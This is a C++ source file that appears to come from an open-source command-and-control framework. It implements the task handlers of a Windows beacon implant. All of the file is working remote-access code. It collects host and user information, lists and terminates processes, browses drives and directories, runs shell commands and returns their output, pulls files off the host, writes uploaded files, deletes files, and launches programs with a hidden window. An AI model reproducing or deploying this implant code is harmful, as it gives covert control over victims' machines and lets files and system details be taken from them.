/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "yasio/xxsocket.hpp"
#include "cmdexec.h"
#include "../base/win/winutil.h"
#include "beacon/beacon.h"
#include<fstream>

using namespace win;

bool exec::format_error_msg(const int msg_id, c2::TaskData& task, std::vector<char>& msg_rsp)
{
	LPSTR msg = nullptr;
	FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), (LPSTR)&msg, 0, NULL);
	if (nullptr != msg)
	{
		std::string error_msg(msg);
		HeapFree(GetProcessHeap(), 0, msg);
		return format_error_msg(msg_id, error_msg, task, msg_rsp);
	}

	return false;
}

bool exec::format_error_msg(const int msg_id, std::string error, c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::ErrorRsp error_rsp;
	error_rsp.set_error(error);
	error_rsp.set_msg_id(msg_id);

	std::vector<char> error_data(error_rsp.ByteSizeLong());
	error_rsp.SerializeToArray(error_data.data(), error_data.size());

	task.set_msg_id(c2::ERROR_RSP);
	task.set_rsp_flag(false);
	task.set_byte_value(error_data.data(), error_data.size());

	msg_rsp.resize(task.ByteSizeLong());
	task.SerializePartialToArray(msg_rsp.data(), msg_rsp.size());
	return false;
}

bool exec::set_rsp_data(const int msg_id, c2::TaskData& task, const std::vector<char>& data, std::vector<char>& msg_rsp)
{
	task.set_byte_value(data.data(), data.size());
	task.set_rsp_flag(true);
	task.set_msg_id(msg_id);

	msg_rsp.resize(task.ByteSizeLong());
	if (!task.SerializePartialToArray(msg_rsp.data(), msg_rsp.size()))
		return format_error_msg(msg_id, "error serialize rsp", task, msg_rsp);

	return true;
}

bool exec::get_host_info(std::vector<char>& host_info)
{
	c2::MapValueData value_data;

	char computer_name[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD max_computer_name_size = MAX_COMPUTERNAME_LENGTH + 1;
	::GetComputerNameA(computer_name, &max_computer_name_size);
	value_data.mutable_dict_value()->insert({ "name", str_a2utf8(computer_name) });


	MEMORYSTATUSEX mem_status = { 0 };
	mem_status.dwLength = sizeof(MEMORYSTATUSEX);
	BOOL isRet = GlobalMemoryStatusEx(&mem_status);
	int size_mb = mem_status.ullTotalPhys / (1024 * 1024);
	value_data.mutable_dict_value()->insert({ "mem", std::to_string(size_mb) });


	LONG(WINAPI *pfnRtlGetVersion)(RTL_OSVERSIONINFOEXW*);
	(FARPROC&)pfnRtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
	RTL_OSVERSIONINFOEXW ver = { 0 };
	ver.dwOSVersionInfoSize = sizeof(ver);
	pfnRtlGetVersion(&ver);

	char version[50] = { 0 };
	sprintf(version, "NT %d.%d Build %d  ProductType:%s", ver.dwMajorVersion, ver.dwMinorVersion, ver.dwBuildNumber, (ver.dwPlatformId != VER_NT_SERVER) ? "desktop" : "server");
	value_data.mutable_dict_value()->insert({ "ver", version });

	std::string innet_addr;
	xxsocket::traverse_local_address([&](const ip::endpoint& ep) -> bool {
		innet_addr = ep.to_string();
		return true;
	});

	LPCSTR priv = get_process_user(GetCurrentProcessId());
	value_data.mutable_dict_value()->insert({ "priv", priv });

	value_data.mutable_dict_value()->insert({ "group", beacon::get_group() });

	value_data.mutable_dict_value()->insert({ "arch", "win" });
	value_data.mutable_dict_value()->insert({ "innet_ip", innet_addr });

	host_info.resize(value_data.ByteSizeLong());
	value_data.SerializePartialToArray(host_info.data(), host_info.size());
	return true;
}

bool exec::task_get_host_info(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	std::vector<char> value_data_buffer;
	get_host_info(value_data_buffer);

	return set_rsp_data(c2::HOST_INFO_RSP, task, value_data_buffer, msg_rsp);
}

bool exec::task_kill_process(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::IntParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
		return format_error_msg(c2::PROCESS_KILL, "error parse param", task, msg_rsp);

	HANDLE phd = OpenProcess(PROCESS_TERMINATE, FALSE, param.param());
	if (!phd)
		return format_error_msg(c2::PROCESS_KILL, task, msg_rsp);

	if (!TerminateProcess(phd, 0))
		return format_error_msg(c2::PROCESS_KILL, task, msg_rsp);

	return task_get_process_list(task, msg_rsp);
}

bool exec::task_get_process_list(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::ProcessListData process_list;
	process_list.set_beacon_pid(GetCurrentProcessId());

	enum_process([&](PROCESSENTRY32W& entry)->bool {

		auto item = process_list.add_item();
		item->set_pid(entry.th32ProcessID);
		item->set_ppid(entry.th32ParentProcessID);
		item->set_name(str_a2utf8(str_w2a(CP_ACP, entry.szExeFile)));
		item->set_user(str_a2utf8(get_process_user(entry.th32ProcessID)));
		item->set_session(get_process_sessionid(entry.th32ProcessID));
		item->set_is64(is_x64(entry.th32ProcessID));

		return true;
	});

	std::vector<char> process_data(process_list.ByteSizeLong());
	process_list.SerializeToArray(process_data.data(), process_data.size());

	return set_rsp_data(c2::PROCESS_INFO, task, process_data, msg_rsp);
}

bool exec::task_get_disk_list(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	DWORD bits = ::GetLogicalDrives();

	DWORD mask = 0x01;
	char partition[3] = "C:";

	c2::DiskListData data;
	for (int i = 0; i < 26; i++, mask = mask << 1)
	{
		if (!(bits & mask))
			continue;

		partition[0] = 'A' + i;
		auto drivers = data.add_drivers();
		drivers->append(partition);
	}

	std::vector<char> disklist_data(data.ByteSizeLong());
	data.SerializeToArray(disklist_data.data(), disklist_data.size());

	return set_rsp_data(c2::DISK_LIST, task, disklist_data, msg_rsp);
}

bool exec::task_get_file_list(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::StrParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::FILE_LIST, "error parse param", task, msg_rsp);
	}

	std::string dir = str_utf82a(param.param());
	std::string find_dir = dir + +"\\*.*";
	WIN32_FIND_DATAA find_data = { 0 };
	HANDLE find = ::FindFirstFileA(find_dir.c_str(), &find_data);
	if (INVALID_HANDLE_VALUE == find)
		return format_error_msg(c2::FILE_LIST, task, msg_rsp);

	c2::FileListData file_list;
	do
	{
		if ((find_data.cFileName[0] == '.' && find_data.cFileName[1] == '\0')
			|| (find_data.cFileName[0] == '.' && find_data.cFileName[1] == '.' && find_data.cFileName[2] == '\0'))
			continue;

		ULARGE_INTEGER filesize;
		filesize.LowPart = find_data.nFileSizeLow;
		filesize.HighPart = find_data.nFileSizeHigh;
		ULARGE_INTEGER lastWritetime;
		lastWritetime.LowPart = find_data.ftLastWriteTime.dwLowDateTime;
		lastWritetime.HighPart = find_data.ftLastWriteTime.dwHighDateTime;

		auto item = file_list.add_files();
		item->set_file_name(str_a2utf8(find_data.cFileName));
		item->set_file_size(filesize.QuadPart);
		item->set_modify_unix_tm(tm_to_unix_tm(lastWritetime.QuadPart));
		item->set_is_dir(find_data.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY);
	} while (::FindNextFileA(find, &find_data));
	::FindClose(find);

	file_list.set_parent_dir(str_a2utf8(dir));

	std::vector<char> filelist_data(file_list.ByteSizeLong());
	file_list.SerializeToArray(filelist_data.data(), filelist_data.size());

	return set_rsp_data(c2::FILE_LIST, task, filelist_data, msg_rsp);
}

bool exec::task_get_cmd_rsp(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::CMDPARAM param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::CMD_COMMAND, "error parse param", task, msg_rsp);
	}

	std::string cmd_out;
	if (!execute_cmd(param.cmd(), param.current_dir(), cmd_out, 2 * 1000))
		return format_error_msg(c2::CMD_COMMAND, task, msg_rsp);

	c2::StrParam cmd_rsp;
	cmd_rsp.set_param(str_a2utf8(cmd_out));

	std::vector<char> data(cmd_rsp.ByteSizeLong());
	cmd_rsp.SerializeToArray(data.data(), data.size());

	return set_rsp_data(c2::CMD_COMMAND, task, data, msg_rsp);
}

bool exec::task_download_file(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::StrParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::DOWNLOAD_FILE, "error parse param", task, msg_rsp);
	}

	std::ifstream file;
	file.open(str_utf82a(param.param()), std::ofstream::binary);
	if (file.fail())
		return format_error_msg(c2::DOWNLOAD_FILE, task, msg_rsp);

	file.seekg(0, std::ios::end);
	auto size = file.tellg();
	file.seekg(0, std::ios::beg);
	if (!size) {
		file.close();
		return format_error_msg(c2::DOWNLOAD_FILE, "file size zero", task, msg_rsp);
	}

	std::vector<char> file_data(size);
	file.read(file_data.data(), size);
	file.close();

	c2::DownLoadFile download;
	download.set_file_path(param.param());
	download.set_file_data(file_data.data(), file_data.size());

	std::vector<char> data(download.ByteSizeLong());
	download.SerializeToArray(data.data(), data.size());

	return set_rsp_data(c2::DOWNLOAD_FILE, task, data, msg_rsp);
}

bool exec::task_upload_file(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::UploadFile upload_data;
	if (!upload_data.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::UPLOAD_FILE, "error parse param", task, msg_rsp);
	}

	std::string path = str_utf82a(upload_data.upload_dir()) + "/" + str_utf82a(upload_data.file_name());
	std::ofstream file;
	file.open(path, std::ofstream::binary);
	if (file.fail())
		return format_error_msg(c2::UPLOAD_FILE, task, msg_rsp);

	file.write(upload_data.file_data().data(), upload_data.file_data().size());
	file.close();

	return true;
}

bool exec::task_delete_file(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::StrParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::DELETE_FILE, "error parse param", task, msg_rsp);
	}

	if (!DeleteFileA(str_utf82a(param.param()).c_str()))
		return format_error_msg(c2::DELETE_FILE, task, msg_rsp);

	return true;
}

bool exec::task_exec_file(c2::TaskData& task, std::vector<char>& msg_rsp)
{
	c2::StrParam param;
	if (!param.ParseFromArray(task.byte_value().data(), task.byte_value().size()))
	{
		return format_error_msg(c2::DELETE_FILE, "error parse param", task, msg_rsp);
	}

	if (!WinExec(str_utf82a(param.param()).c_str(), SW_HIDE))
		return format_error_msg(c2::EXEC_FILE, task, msg_rsp);

	return task_get_process_list(task, msg_rsp);
}
